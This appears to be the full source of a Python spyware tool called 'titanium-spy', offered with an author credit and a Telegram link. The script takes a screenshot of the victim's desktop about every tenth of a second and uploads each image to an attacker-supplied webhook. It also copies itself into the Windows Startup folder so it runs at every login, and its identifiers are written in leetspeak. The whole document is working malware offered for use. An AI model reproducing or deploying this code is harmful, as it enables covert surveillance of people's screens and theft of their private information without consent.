# SCRIPT MAKE BY NOCTADETP
# GITHUB https://github.com/noctadetp/titanium-spy
# TELEGRAM https://t.me/GoreAnd
# LICENCE https://github.com/noctadetp/titanium-spy/LICENCE

# DEF THE MODULE EXPORTED
import time, os, requests, shutil, sys, pyautogui

# DEF THE WEBHOOK
h00k = "yourwbhook"

# DEF THE PRINCIPAL SCRIPT
def SCR33N5734L3R():
    SCR33N5H0T_P47H = '1337.png'
    SCR33N5H07 = pyautogui.screenshot()
    SCR33N5H07.save(SCR33N5H0T_P47H)
    with open(SCR33N5H0T_P47H, 'rb') as f:
        f1l3 = {'file': (os.path.basename(SCR33N5H0T_P47H), f)}
        response = requests.post(h00k, files=f1l3)
    os.remove(SCR33N5H0T_P47H)

# DEF THE PUT ON STARTUP
def PU70N574R7UP(script_path):
    S74R7UP_F0LD3R = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    SCR1P7_N4M3 = os.path.basename(script_path)
    S74R7UP_SCR1P7_P47H = os.path.join(S74R7UP_F0LD3R, SCR1P7_N4M3)
    if os.path.exists(S74R7UP_SCR1P7_P47H):
        SCR1P71NG = False
    else:
        shutil.copy(script_path, S74R7UP_SCR1P7_P47H)
script_path = os.path.abspath(sys.argv[0])
PU70N574R7UP(script_path)

# DEF THE INFINITE LOOP
while True:
    SCR33N5734L3R()
    time.sleep(0.1)
